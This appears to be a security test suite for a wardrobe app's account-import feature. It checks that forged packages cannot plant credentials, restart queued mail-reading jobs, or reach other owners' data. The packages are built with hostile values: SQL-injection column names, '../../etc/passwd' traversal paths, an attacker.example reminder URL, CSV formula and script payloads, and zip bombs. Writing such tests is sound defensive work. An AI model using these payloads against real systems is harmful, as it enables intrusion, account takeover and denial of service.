    for (const path of Object.keys(files).filter((p) => p.startsWith("records/") && p !== "records/media.json" && p !== "records/conversation.json")) {
      files = withJson(files, path, (value) => {
        value.tables = { ...(value.tables ?? {}), ...tables };
        if (path === "records/account.json") Object.assign(value, { identities: tables.auth_identities.rows, grants: tables.mcp_grants.rows, credentials: tables.connection_credentials.rows, sessions: tables.auth_session_floors.rows });
      });
    }
    files["records/identity.json"] = encoder.encode(JSON.stringify({ component: "identity", title: "planted", tables }));
    const zip = await repack(files, { manifest: (m) => m.components.push({ name: "identity", title: "planted", state: "complete", records: 99, note: null, files: ["records/identity.json"] }) });

    const target = await freshTarget("planted credentials");
    const identityBefore = await sql("SELECT issuer, subject, linked_at, unlinked_at FROM auth_identities WHERE user_id = ?", target.userId);
    const recoveryBefore = await sql("SELECT kit_id, verifier, status FROM recovery_credentials WHERE user_id = ?", target.userId);
    const userBefore = await sql("SELECT * FROM users WHERE user_id = ?", target.userId);
    const victimRows = await settledSnapshot(victim);
    const donorRows = await ownerSnapshot(donor);
    const response = await importInto(target, zip);
    const report = (await response.json()) as any;
    expect(response.status, JSON.stringify(report).slice(0, 300)).toBe(200);

    expect(await sql("SELECT issuer, subject, linked_at, unlinked_at FROM auth_identities WHERE user_id = ?", target.userId)).toEqual(identityBefore);
    expect(await sql("SELECT 1 FROM auth_identities WHERE subject = ?", planted.subject)).toEqual([]);
    expect(await sql("SELECT kit_id, verifier, status FROM recovery_credentials WHERE user_id = ?", target.userId)).toEqual(recoveryBefore);
    expect(await sql("SELECT * FROM users WHERE user_id = ?", target.userId)).toEqual(userBefore);
    for (const table of ["mcp_grants", "auth_session_floors", "connection_credentials", "connection_profiles", "connection_oauth_states", "notification_devices", "identity_link_tickets", "export_tickets", "account_deletions", "submitted_proposals"]) {
      expect(await sql(`SELECT 1 FROM ${table} WHERE user_id = ?`, target.userId), `${table} of the target`).toEqual([]);
    }
    // Decisions are restorable (API thread ruling), but never the attacker's planted ones.
    const plantedDecisionIds = tables.proposal_decisions.rows.map((r: Record<string, any>) => String(r.proposal_id));
    const targetDecisionIds = (await sql<{ proposal_id: string }>("SELECT proposal_id FROM proposal_decisions WHERE user_id = ?", target.userId)).map((r) => r.proposal_id);
    expect(targetDecisionIds.filter((id) => plantedDecisionIds.includes(id)), "planted proposal decisions on the target").toEqual([]);
    // In behaviour, not only in rows: the planted sign-in opens nothing, the donor's assistant reads the donor's wardrobe only,
    // the donor's recovery kit recovers the donor's account only, and nothing waits or was decided for the target.
    expect((await new ApiClient(planted).get("/v1/me")).status).toBe(403);
    expect((await new ApiClient(planted).get("/v1/wardrobe")).status).toBe(403);
    const viaAssistant = toolResult(await donorMcp.client.callTool({ name: "garderobe_inventory", arguments: { view: "snapshot" } }));
    expect(viaAssistant.ok).toBe(true);
    expect(JSON.stringify(viaAssistant.data)).not.toContain(target.userId);
    expect(JSON.stringify(viaAssistant.data)).not.toContain(formulaGarmentIds[0]!);
    expect(await ownerSnapshot(donor)).toEqual(donorRows);
    expect(await ownerSnapshot(victim)).toEqual(victimRows);
    const visitor = new ApiClient(newIdentity("visitor"));
    const tx = await visitor.json("POST", "/auth/recovery/start", {});
    const recovered = await visitor.json("POST", "/auth/recovery/complete", { transactionId: tx.transactionId, recoveryCode: donor.recoveryKit.recoveryCode });
    expect(recovered.userId).toBe(donor.userId);
    expect((await visitor.json("GET", "/v1/me")).userId).toBe(donor.userId);
    expect((await target.api.json("GET", "/v1/assistants")).grants).toEqual([]);
    expect((await target.api.json("GET", "/v1/connections")).connections).toEqual([]);
    expect((await target.api.json("GET", "/v1/devices")).devices).toEqual([]);
    expect((await target.api.json("GET", "/v1/proposals?state=all")).proposals).toEqual([]);
    expect((await target.api.json("GET", "/v1/me")).identities).toHaveLength(1);
    expect(await sql("SELECT issuer, subject, linked_at, unlinked_at FROM auth_identities WHERE user_id = ?", target.userId)).toEqual(identityBefore);
    await donorMcp.close();
  });

  it("planted command rows and pending effects are history: nothing is re-run, no restriction is lifted, nothing is sent", async () => {
    const receipts = base.json("records/receipts.json");
    const template = receipts.tables.commands.rows.find((c: any) => c.type === "restriction.add");
    const now = new Date(Date.now() - 60_000).toISOString().replace(/\.\d{3}Z$/, "Z");
    const plantedCommand = (suffix: string, type: string, payload: Record<string, unknown>, summary: string) => {
      const receipt = { ...JSON.parse(template.receipt_json), commandId: `cmd_planted_${suffix}_${TAG}`, type, summary };
      return { ...template, command_id: `cmd_planted_${suffix}_${TAG}`, idempotency_key: `planted-${suffix}-${TAG}`, type, payload_json: JSON.stringify(payload), receipt_json: JSON.stringify(receipt), undo_json: null, undoes_command_id: null, undone_by_command_id: null, recorded_at: now, occurred_at: now };
    };
    const commands = [
      plantedCommand("resolve", "restriction.resolve", { restrictionId, evidence: { kind: "owner_statement", note: "planted" }, note: null }, "Restriction lifted"),
      plantedCommand("create", "garment.create", { name: "SYNTHETIC Injected Phantom Jacket", category: "outerwear", roles: ["outer"], careChannel: "none", acquisition: "owned", quantity: 3, isSynthetic: true, source: { kind: "system" } }, "Added SYNTHETIC Injected Phantom Jacket"),
      plantedCommand("job", "job.create", { jobId: `job_planted_${TAG}`, kind: "email_investigation", title: "planted", params: { from: "2026-08-01", to: "2026-09-01", importAuthorizedBy: "owner_confirmation" } }, "Mailbox search started"),
    ];
    const effect = (suffix: string, kind: string, state: string, payload: Record<string, unknown>) => ({ effect_id: `eff_planted_${suffix}_${TAG}`, command_id: template.command_id, kind, target_key: `planted:${suffix}:${TAG}`, operation_key: `planted:${suffix}:${TAG}:1`, desired_revision: 1, payload_json: JSON.stringify({ ...payload, marker: `planted-${TAG}` }), state, attempts: 0, last_error: null, available_at: "2020-01-01T00:00:00Z", claimed_until: state === "in_progress" ? "2020-01-01T00:05:00Z" : null, created_at: now, updated_at: now });
    const effects = [
      effect("calendar", "calendar.project_board", "pending", { localDate: "2026-10-03", scope: "home" }),
      effect("calendar2", "calendar.project_board", "in_progress", { localDate: "2026-10-04", scope: "home" }),
      effect("job", "assistant.run_job", "pending", { jobId: `job_planted_${TAG}`, kind: "email_investigation" }),
      effect("notify", "notification.reminder", "pending", { reminderId: `rem_planted_${TAG}`, kind: "sale", title: "SYNTHETIC planted reminder", dueAt: now, leadMinutes: 0 }),
      effect("reminder", "calendar.project_reminder", "in_progress", { reminderId: `rem_planted_${TAG}`, kind: "sale", title: "SYNTHETIC planted reminder", dueAt: now, note: null, url: `https://attacker.example/${TAG}` }),
    ];
    let files = withJson(base.files, "records/receipts.json", (value) => {
      value.tables.commands.rows.push(...commands);
      value.tables.effects.columns = Object.keys(effects[0]!);
      value.tables.effects.rows.push(...effects);
    });
    files = withJson(files, "records/assistant.json", (value) => {
      // A job that already ended, with the authorization flag set: history, never a reason to read mail.
      value.tables.assistant_jobs.push({ job_id: `job_planted_${TAG}`, version: 2, kind: "email_investigation", state: "failed", title: "SYNTHETIC planted mailbox import", params_json: JSON.stringify({ from: "2026-08-01", to: "2026-09-01", merchants: [], importAuthorizedBy: "owner_confirmation" }), priority: 1, progress_json: "{}", coverage_json: null, result_ref: null, unresolved_reason: "SYNTHETIC planted", committed_command_ids_json: "[]", delivery_id: `dlv_planted_${TAG}`, created_at: now, updated_at: now });
    });
    const target = await freshTarget("planted commands and effects");
    const response = await importInto(target, await repack(files));
    const report = (await response.json()) as any;
    expect(response.status, JSON.stringify(report).slice(0, 300)).toBe(200);
    expect(report.externalEffectsReplayed).toBe(0);

    const check = async (when: string, imported?: Set<string>) => {
      // The restriction is as the restriction record says, whatever receipt was planted beside it.
      expect(await sql("SELECT status FROM restrictions WHERE user_id = ? AND restriction_id = ?", target.userId, restrictionId), when).toEqual(report.state === "completed" ? [{ status: "active" }] : []);
      expect((await inventory(target)).items.some((i) => /Phantom Jacket/.test(i.garment.name)), when).toBe(false);
      const stored = await sql<{ effect_id: string; kind: string; target_key: string; available_at: string; state: string; attempts: number; claimed_until: string | null; payload_json: string }>("SELECT effect_id, kind, target_key, available_at, state, attempts, claimed_until, payload_json FROM effects WHERE user_id = ?", target.userId);
      for (const row of stored) {
        const describe = `${when}: effect ${row.effect_id} (kind ${row.kind}, target ${row.target_key}, available_at ${row.available_at}, attempts ${row.attempts}) is ${row.state}`;
        // Everything that arrived with the package is settled history. An effect the target's own later actions caused (here the
        // Google connection projecting today's board) is ordinary work and may wait for a retry, but it must not be planted work.
        if (!imported || imported.has(row.effect_id)) expect(["pending", "in_progress"], describe).not.toContain(row.state);
        else {
          expect(row.target_key, describe).not.toMatch(/^planted:/);
          expect(row.payload_json ?? "", describe).not.toContain(`planted-${TAG}`);
        }
        if (row.effect_id.includes("_planted_")) expect(row, when).toMatchObject({ state: "cancelled", attempts: 0, claimed_until: null });
      }
      expect(await sql("SELECT 1 FROM orders WHERE user_id = ?", target.userId), when).toEqual([]);
      expect(await sql("SELECT 1 FROM mail_seen WHERE user_id = ?", target.userId), when).toEqual([]);
      const job = await sql<{ state: string; committed_command_ids_json: string }>("SELECT state, committed_command_ids_json FROM assistant_jobs WHERE user_id = ? AND job_id = ?", target.userId, `job_planted_${TAG}`);
      for (const j of job) {
        expect(j.state, `${when}: the planted job`).toBe("failed");
        expect(JSON.parse(j.committed_command_ids_json), when).toEqual([]);
      }
    };
    await check("right after the import");
    if (report.state === "completed") {
      const idsAfterImport = new Set((await sql<{ command_id: string }>("SELECT command_id FROM commands WHERE user_id = ?", target.userId)).map((c) => c.command_id));
      const effectsAfterImport = new Set((await sql<{ effect_id: string }>("SELECT effect_id FROM effects WHERE user_id = ?", target.userId)).map((e) => e.effect_id));
      // Give the planted work every chance: connect Google (labelled fixture) for mail and calendar, then let the scheduled work run.
      const seq = await outboundSeq();
      await connectGoogle(target, ["gmail.read_orders", "calendar.read", "calendar.write_outfit_calendar"]);
      await target.api.json("GET", "/v1/connections");
      for (let i = 0; i < 3; i++) await runCron();
      await quiesce();
      await check("after scheduled work", effectsAfterImport);
      const sent = await outboundLog({ after: seq, contains: TAG });
      expect(sent.map((e) => `${e.method} ${e.host}`), "requests carrying the planted marker").toEqual([]);
      expect((await outboundLog({ after: seq, host: "attacker.example" })).length).toBe(0);
      const ran = (await sql<{ command_id: string; type: string }>("SELECT command_id, type FROM commands WHERE user_id = ?", target.userId)).filter((c) => !idsAfterImport.has(c.command_id)).map((c) => c.type);
      for (const type of ["restriction.resolve", "garment.create", "order.record", "order.log", "job.create", "job.update", "mail.record_sync"]) expect(ran, `commands that ran after the import: ${[...new Set(ran)].join(", ")}`).not.toContain(type);
      const ownWaiting = (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM effects WHERE user_id = ? AND state IN ('pending', 'in_progress')", target.userId))[0]!.n;
      expect((await target.api.json("GET", "/v1/recovery")).pending.effects, "only the target's own new work may be waiting").toBe(ownWaiting);
    } else {
      expect((await inventory(target)).total).toBe(0);
    }
  });

  it("[fixed D08-4] a background job that is still queued inside a package arrives cancelled and is not started by the scheduled sweep after the import", async () => {
    const receipts = base.json("records/receipts.json");
    const template = receipts.tables.commands.rows.find((c: any) => c.type === "restriction.add");
    const now = new Date(Date.now() - 60_000).toISOString().replace(/\.\d{3}Z$/, "Z");
    const jobId = `job_queued_${TAG}`;
    const commandId = `cmd_planted_jobcreate_${TAG}`;
    // The receipt the job runner looks for when it decides whether found orders may be logged: written into the package.
    const created = { ...template, command_id: commandId, idempotency_key: `planted-jobcreate-${TAG}`, type: "job.create", actor: "owner", authorization_basis: "owner_tap", channel: "ios", payload_json: JSON.stringify({ jobId, kind: "email_investigation", title: "SYNTHETIC planted", params: { from: "2026-07-03", to: "2026-07-29", importAuthorizedBy: "owner_confirmation" } }), receipt_json: JSON.stringify({ ...JSON.parse(template.receipt_json), commandId, type: "job.create", summary: "Mailbox search started" }), undo_json: null, undoes_command_id: null, undone_by_command_id: null, recorded_at: now, occurred_at: now };
    let files = withJson(base.files, "records/receipts.json", (value) => {
      value.tables.commands.rows.push(created);
      value.tables.command_entities.rows.push({ command_id: commandId, kind: "job", entity_id: jobId, version: 1 });
    });
    files = withJson(files, "records/assistant.json", (value) => {
      value.tables.assistant_jobs.push({ job_id: jobId, version: 1, kind: "email_investigation", state: "queued", title: "SYNTHETIC planted mailbox import", params_json: JSON.stringify({ from: "2026-07-03", to: "2026-07-29", merchants: [], importAuthorizedBy: "owner_confirmation" }), priority: 1, progress_json: "{}", coverage_json: null, result_ref: null, unresolved_reason: null, committed_command_ids_json: "[]", delivery_id: `dlv_queued_${TAG}`, created_at: now, updated_at: now });
    });
    const target = await freshTarget("a queued job in the package");
    const report = (await (await importInto(target, await repack(files))).json()) as any;
    expect(report.state).toBe("completed");
    expect(report.externalEffectsReplayed).toBe(0);
    // Later the owner of the new account connects Google with mail access (labelled Google fixture) for their own reasons.
    const seq = await outboundSeq();
    await connectGoogle(target, ["gmail.read_orders", "calendar.read"]);
    await target.api.json("GET", "/v1/connections");
    for (let i = 0; i < 3; i++) await runCron();
    const job = (await sql<{ state: string; unresolved_reason: string | null }>("SELECT state, unresolved_reason FROM assistant_jobs WHERE user_id = ? AND job_id = ?", target.userId, jobId))[0]!;
    const started = await sql<{ type: string }>("SELECT c.type FROM commands c JOIN command_entities e ON e.user_id = c.user_id AND e.command_id = c.command_id WHERE c.user_id = ? AND e.kind = 'job' AND e.entity_id = ? AND c.command_id != ?", target.userId, jobId, commandId);
    // The outbound log is shared with the files that run at the same time (src/outbound.ts), so only mailbox queries for
    // the planted job's own period count: every mailbox query carries its job's period (connections/google.ts), and no
    // other test uses this one. Without the period filter another file's mailbox search would be counted here.
    const mailRequests = (await outboundLog({ after: seq, contains: "/gmail/v1/users/me/messages" })).filter((e) => (new URL(e.url).searchParams.get("q") ?? "").includes("after:2026/07/03")).length;
    // Work that had not been done when the package was written stays undone: an import starts nothing.
    expect({ state: job.state, commandsForTheJob: started.map((c) => c.type), mailRequests }, `the planted job after the scheduled sweep (${job.unresolved_reason ?? "no reason recorded"})`).toEqual({ state: "cancelled", commandsForTheJob: [], mailRequests: 0 });
  });

  it("hostile column and table names are never SQL: unknown names are dropped, and no other account is written", async () => {
    const injection = `name") VALUES ('x'); DROP TABLE garments; --`;
    let files = withJson(base.files, "records/inventory.json", (inv) => {
      inv.tables.garments.columns = [...inv.tables.garments.columns, injection, "user_id", "rowid", "no_such_column", "NAME", "name; DROP TABLE users", ...Array.from({ length: 3000 }, (_v, i) => `column_${i}`)];
      for (const row of inv.tables.garments.rows) Object.assign(row, { [injection]: "x", user_id: victim.userId, rowid: 1, no_such_column: "x" });
      inv.tables["garments; DROP TABLE users; --"] = { description: "planted", columns: ["name"], rows: [{ name: "x" }] };
      inv.tables["sqlite_master"] = { description: "planted", columns: ["name"], rows: [{ name: "x" }] };
    });
    files = withJson(files, "records/assistant.json", (value) => {
      for (const rows of Object.values(value.tables) as any[][]) for (const row of rows) Object.assign(row, { user_id: victim.userId, [`topic) VALUES ('x'); DROP TABLE research_notes; --`]: "x", "USER_ID": victim.userId });
      value.tables["users; DROP TABLE users"] = [{ user_id: victim.userId }];
    });
    const target = await freshTarget("hostile column names");
    const before = await ownerRows(target, { ignore: ATTEMPT_RECORDS });
    const victimRows = await settledSnapshot(victim);
    const tablesBefore = await tableNames();
    const response = await importInto(target, await repack(files));
    const text = await response.text();
    expect(response.status, text.slice(0, 300)).toBe(200);
    const report = JSON.parse(text);
    expect(text).not.toMatch(/SQLITE|D1_ERROR|syntax error/);
    expect(await tableNames()).toEqual(tablesBefore);
    expect(await ownerSnapshot(victim)).toEqual(victimRows);
    if (report.state === "completed") {
      expect((await inventory(target)).total).toBe((await inventory(attacker)).total);
      expect(report.components.find((c: any) => c.name === "inventory").note).toMatch(/not known|not imported/i);
    } else {
      expect(report.state).toBe("failed");
      expect(await ownerRows(target, { ignore: ATTEMPT_RECORDS })).toEqual(before);
    }
  });

  it("image records that point outside the package or at another owner's storage store nothing they should not", async () => {
    const victimKey = (await sql<{ object_key: string }>("SELECT object_key FROM media_renditions WHERE user_id = ? AND kind = 'original' LIMIT 1", victim.userId))[0]!.object_key;
    const media = base.json("records/media.json");
    const exportedKeys = Object.keys(media.files);
    expect(exportedKeys.length).toBeGreaterThan(0);
    // The image files the honest package carries: whatever a target is later served must be one of these, byte for byte.
    const packageImages = new Set<string>();
    for (const path of new Set(Object.values(media.files as Record<string, string>))) {
      const file = base.files[path];
      expect(file, `the package holds ${path}`).toBeDefined();
      expect(imageSignature(file!), `${path} is an image file`).not.toBeNull();
      packageImages.add(await sha256(file!));
    }
    expect(packageImages.size).toBeGreaterThan(0);
    const SERVED_TYPES = new Set(["image/jpeg", "image/png", "image/webp"]);
    const variants: [string, (value: any) => void][] = [
      ["the file map points at a JSON record instead of the image", (value) => { for (const key of Object.keys(value.files)) value.files[key] = "records/inventory.json"; }],
      ["the file map points outside the package", (value) => { for (const key of Object.keys(value.files)) value.files[key] = "../../etc/passwd"; }],
      ["the rendition records name another owner's storage key", (value) => { for (const r of value.records.records.renditions) r.file = victimKey; for (const a of value.assets) a.file = victimKey; value.files = { [victimKey]: Object.values(value.files)[0] }; }],
      ["the rendition records name a path with traversal", (value) => { for (const r of value.records.records.renditions) r.file = `assets/../../${victim.userId}/assets/x/original-0000000000000000.png`; }],
      ["the rendition records carry a raw storage key column", (value) => { for (const r of value.records.records.renditions) r.object_key = victimKey; }],
    ];
    const victimObjects = await mediaKeys(`u/${victim.userId}/`);
    const victimRows = await settledSnapshot(victim);
    const outcomes: Record<string, string> = {};
    const TRAVERSAL = "the rendition records name a path with traversal";
    const traversal: { state?: string; liveImages?: number; renditionsNotDeleted?: number; storedFiles?: string[] } = {};
    for (const [what, change] of variants) {
      const target = await freshTarget(`hostile image records: ${what}`);
      const response = await importInto(target, await repack(withJson(base.files, "records/media.json", change)));
      const text = await response.text();
      expect([200, 400], `${what}: ${text.slice(0, 200)}`).toContain(response.status);
      const state = response.status === 200 ? JSON.parse(text).state : "rejected";
      outcomes[what] = state;
      if (what === TRAVERSAL) {
        traversal.state = state;
        traversal.liveImages = (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM media_assets WHERE user_id = ? AND status != 'deleted'", target.userId))[0]!.n;
        traversal.renditionsNotDeleted = (await sql<{ n: number }>("SELECT COUNT(*) AS n FROM media_renditions WHERE user_id = ? AND status != 'deleted'", target.userId))[0]!.n;
        traversal.storedFiles = await mediaKeys(`u/${target.userId}/`);
      }
      // Whatever the import decided, no record of the target points outside the target's own prefix or at the other owner's object,
      // and every image the target can be served is the bytes its record names.
      expect(await sql("SELECT 1 FROM media_renditions WHERE user_id = ? AND (object_key NOT LIKE ? OR object_key LIKE '%..%')", target.userId, `u/${target.userId}/%`), what).toEqual([]);
      expect(await sql("SELECT 1 FROM media_renditions WHERE object_key = ? AND user_id != ?", victimKey, victim.userId), what).toEqual([]);
      if (state === "completed") await expectMediaIntact(target);
      // (When the import failed, the image files it had already stored stay behind without a record: see D08-2.)
      for (const key of await mediaKeys(`u/${target.userId}/`)) expect(key.startsWith(`u/${target.userId}/assets/`), what).toBe(true);
      const active = await sql<{ rendition_id: string; kind: string; content_type: string; sha256: string; object_key: string; asset_status: string }>(
        "SELECT r.rendition_id, r.kind, r.content_type, r.sha256, r.object_key, a.status AS asset_status FROM media_renditions r JOIN media_assets a ON a.user_id = r.user_id AND a.asset_id = r.asset_id WHERE r.user_id = ? AND r.status = 'active'",
        target.userId,
      );
      for (const row of active) {
        // Serveable: the asset is not deleted or rejected, the type is an image type that is served, and the bytes are stored.
        const stored = (await bindings().MEDIA_BUCKET!.head(row.object_key)) !== null;
        const serveable = stored && SERVED_TYPES.has(row.content_type) && !["deleted", "rejected"].includes(row.asset_status);
        const label = `${what}: rendition ${row.kind} (${row.content_type}, asset ${row.asset_status}, ${stored ? "stored" : "no stored object"})`;
        const served = await target.api.get(`/v1/media/renditions/${row.rendition_id}`);
        expect(served.status, `${label}: never a server error`).toBeLessThan(500);
        if (serveable) {
          expect(served.status, `${label}: an active, stored image is served to its owner`).toBe(200);
          const type = served.headers.get("content-type") ?? "";
          expect(type, label).toMatch(/^image\/(jpeg|png|webp)$/);
          const bytes = new Uint8Array(await served.arrayBuffer());
          expect(decoder.decode(bytes.subarray(0, 40)), `${what}: a served image is a JSON record`).not.toContain('"tables"');
          expect(imageSignature(bytes), `${label}: the served bytes are an image of the type they are served as`).toBe(type);
          const digest = await sha256(bytes);
          expect(packageImages.has(digest), `${label}: the served bytes are one of the package's own image files`).toBe(true);
          // A derived rendition is served exactly as recorded; an original is served without metadata, which for these files is the same bytes.
          if (row.kind !== "original") expect(digest, label).toBe(row.sha256);
        } else {
          // The documented refusal for a record that cannot be served (no object, a type that is not served, a deleted or rejected asset).
          expect(served.status, `${label}: refused`).toBe(404);
          expect((await errorOf(served)).code, label).toBe("not_found");
        }
      }
    }
    expect(await mediaKeys(`u/${victim.userId}/`)).toEqual(victimObjects);
    expect(await ownerSnapshot(victim)).toEqual(victimRows);
    // A rendition record whose path has traversal is set aside record by record, and the rest of the package imports. The
    // importer accepts an image file only when its rendition record names the same package path, and a path containing ".."
    // names none (packages/media/src/portability.ts:58-62 `toRelative`; :657-662 the file is listed as mismatched and never
    // read). Only records whose file was verified are imported (:717-719, :733-735), only verified files are written, under a
    // key rebuilt from their own bytes (:706-712, :876-895), and the import then completes (apps/worker/src/export/import.ts:
    // 209-227). So the job completes, and the target holds none of the package's images: no live image record, no rendition
    // that is not deleted, and no stored file. (The import report still counts the media records as imported with no note,
    // import.ts:203: a reporting gap, recorded in the report of this change, not a storage one.)
    expect(traversal, "what an import whose rendition records name a path with traversal leaves in the target").toEqual({ state: "completed", liveImages: 0, renditionsNotDeleted: 0, storedFiles: [] });
  });

  defect("D08-2", "an import that fails part-way says 'nothing from it was kept' but leaves the records of the modules that had already been written", async () => {
    // The ledger, the daily records, the assistant's records and the conversation import; then the image records are refused.
    // The refusal: every derived image file names itself as its source. Its file and record otherwise match, so it passes every
    // file check, and the importer refuses the image records as a whole when it orders them by source, after the other modules
    // were written (packages/media/src/portability.ts:155-180 `sourceOrder`, called at :856). (A rendition path with ".." no
    // longer fails an import: that record alone is set aside and the import completes; see the test above.)
    let selfDerived = 0;
    const zip = await repack(withJson(base.files, "records/media.json", (value) => { for (const r of value.records.records.renditions) if (r.source_rendition_id) { r.source_rendition_id = r.rendition_id; selfDerived++; } }));
    expect(selfDerived, "the package has derived image files to make circular").toBeGreaterThan(0);
    const target = await freshTarget("import failing part-way");
    const before = await ownerRows(target);
    const response = await importInto(target, zip);
    const report = (await response.json()) as any;
    expect(response.status).toBe(200);
    expect(report.state).toBe("failed");
    expect(report.error).toMatch(/nothing from it was kept/i);
    const left = await ownerRows(target, { ignore: ATTEMPT_RECORDS });
    const messages = (await target.api.json("GET", "/v1/conversation/messages")).messages as any[];
    const objects = (await mediaKeys(`u/${target.userId}/`)).length;
    const baseline = await (async () => {
      const rows = { ...before };
      for (const table of ATTEMPT_RECORDS) delete rows[table];
      return rows;
    })();
    expect({ rows: left, messages: messages.length, storedImageFiles: objects }, "what the failed import left behind").toEqual({ rows: baseline, messages: 0, storedImageFiles: 0 });
    // And the account can still take the honest package afterwards.
    const retry = await importInto(target, base.zip);
    expect(((await retry.json()) as any).state).toBe("completed");
  });

  it("huge values, invalid UTF-8, deep nesting and a spreadsheet view with thousands of columns never crash the import or leak into a later export", async () => {
    const badUtf8 = (() => {
      const text = base.text("records/laundry.json");
      const at = text.indexOf('"description"');
      const bytes = encoder.encode(text);
      const cut = encoder.encode(text.slice(0, at + 16)).length;
      return new Uint8Array([...bytes.subarray(0, cut), 0xff, 0xfe, 0xc0, 0xaf, 0xed, 0xa0, 0x80, ...bytes.subarray(cut)]);
    })();
    const wideCsv = encoder.encode([Array.from({ length: 5000 }, (_v, i) => `=col${i}()`).join(","), ...Array.from({ length: 40 }, () => Array.from({ length: 5000 }, () => "@SUM(1)").join(","))].join("\r\n"));
    const variants: [string, Record<string, Uint8Array>][] = [
      ["a 1.5 MB garment name", withJson(base.files, "records/inventory.json", (inv) => (inv.tables.garments.rows[0].name = `SYNTHETIC ${"A".repeat(1_500_000)}`))],
      ["a 300 KB alias and note", withJson(base.files, "records/inventory.json", (inv) => { inv.tables.garment_aliases.rows[0].phrase = `SYNTHETIC ${"é".repeat(150_000)}`; inv.tables.garments.rows[1].season_note = "\u0000\u202e".repeat(50_000); })],
      ["invalid UTF-8 inside a record", { ...base.files, "records/laundry.json": badUtf8 }],
      ["a record file nested 200,000 levels deep", { ...base.files, "records/laundry.json": encoder.encode(`{"tables":${"[".repeat(200_000)}${"]".repeat(200_000)}}`) }],
      ["a record file that is not JSON", { ...base.files, "records/wear.json": encoder.encode("<html><script>alert(1)</script></html>") }],
      ["rows that are not objects", withJson(base.files, "records/inventory.json", (inv) => (inv.tables.garments.rows = [null, 7, "x", []]))],
      ["a number where text belongs and text where a number belongs", withJson(base.files, "records/quantities.json", (q) => { q.tables.stock_balances.rows[0].quantity = "1e400"; q.tables.stock_balances.rows[1].quantity = -5; })],
      ["a spreadsheet view with 5,000 formula columns", { ...base.files, "views/inventory.csv": wideCsv, "views/wear-history.csv": wideCsv }],
    ];
    for (const [what, files] of variants) {
      const target = await freshTarget(what);
      const before = await ownerRows(target);
      const response = await importInto(target, await repack(files));
      const text = await response.text();
      expect([200, 400], `${what} -> ${response.status} ${text.slice(0, 160)}`).toContain(response.status);
      expect(text, what).not.toMatch(/SQLITE|D1_ERROR|\bat [A-Za-z.]+ \(|\.ts:\d+|Maximum call stack/);
      const state = response.status === 200 ? JSON.parse(text).state : "rejected";
      expect(["completed", "failed", "rejected"], what).toContain(state);
      // The account answers afterwards, and either holds the package or holds nothing of its ledger.
      const wardrobe = await target.api.get("/v1/wardrobe");
      expect(wardrobe.status, `${what}: the wardrobe is readable afterwards`).toBe(200);
      const total = ((await wardrobe.json()) as any).total;
      if (state === "completed") {
        const again = await exportPackage(target);
        expect(liveFormulaCells(again), what).toEqual([]);
        expect(parseCsv(again.text("views/inventory.csv"))[0]!.length, `${what}: the view is rebuilt from the records`).toBeLessThan(40);
      } else {
        expect(total, what).toBe(0);
        for (const table of ["garments", "commands", "stock_events", "stock_balances", "style_documents", "restrictions"]) expect((await ownerRows(target))[table] ?? 0, `${what}: ${table}`).toBe(before[table] ?? 0);
      }
    }
  });
});

describe("imports: decompression (kept last: these packages are large once inflated)", () => {
  it("a zip bomb entry the manifest does not list is refused, the account is untouched and the service keeps answering", async () => {
    const bomb = zipWithBomb(base.files, "records/zeros.json", 256);
    expect(bomb.length).toBeLessThan(base.zip.length * 3 + 2_000_000);
    const target = await freshTarget("zip bomb");
    const before = await ownerRows(target);
    const response = await importInto(target, bomb);
    expect([400, 413], `-> ${response.status}`).toContain(response.status);
    await response.text();
    expect(await ownerRows(target)).toEqual(before);
    expect((await victim.api.get("/v1/meta")).status).toBe(200);
    expect((await inventory(target)).total).toBe(0);
  });

  it("[fixed D08-3] the importer bounds inflation: a small upload whose one entry expands to 256 MB, listed in the manifest with its true size and checksum, is refused and nothing is imported", async () => {
    // The same bomb, now listed in the manifest with its true size and checksum, as a holder of the package can do.
    const listedPackage = async (megabytes: number): Promise<Uint8Array> => {
      const digest = new crypto.DigestStream("SHA-256");
      const writer = digest.getWriter();
      const block = new Uint8Array(1024 * 1024);
      for (let i = 0; i < megabytes; i++) await writer.write(block);
      await writer.close();
      const zeros = [...new Uint8Array(await digest.digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
      const manifest = JSON.parse(base.text("manifest.json"));
      manifest.files.push({ path: "records/zeros.json", bytes: megabytes * 1024 * 1024, sha256: zeros });
      const manifestBytes = encoder.encode(JSON.stringify(manifest));
      const sums = `${base.text("checksums.sha256").split("\n").filter((l) => l && !l.endsWith("  manifest.json")).join("\n")}\n${zeros}  records/zeros.json\n${await sha256(manifestBytes)}  manifest.json\n`;
      return zipWithBomb({ ...base.files, "manifest.json": manifestBytes, "checksums.sha256": encoder.encode(sums) }, "records/zeros.json", megabytes);
    };
    // Control: the identical package with a 1 MB entry of the same name is accepted, so the refusal below is
    // the inflated size and not the extra listed file or its name.
    const control = await importInto(await freshTarget("listed small zeros entry (control)"), await listedPackage(1));
    const controlText = await control.text();
    expect(control.status, `the control package with a 1 MB listed entry: ${controlText.slice(0, 160)}`).toBeLessThan(300);
    const megabytes = 256;
    const bomb = await listedPackage(megabytes);
    const ratio = (megabytes * 1024 * 1024) / bomb.length;
    expect(ratio).toBeGreaterThan(100);
    const target = await freshTarget("listed zip bomb");
    const response = await importInto(target, bomb);
    const text = await response.text();
    // A package whose single entry inflates to several times the route's own 95 MB upload limit must be refused before it is inflated.
    expect([400, 413], `a ${Math.round(bomb.length / 1024)} KB upload inflating ${Math.round(ratio)} times was answered ${response.status} ${text.slice(0, 120)}`).toContain(response.status);
    expect((await inventory(target)).total).toBe(0);
  });
});
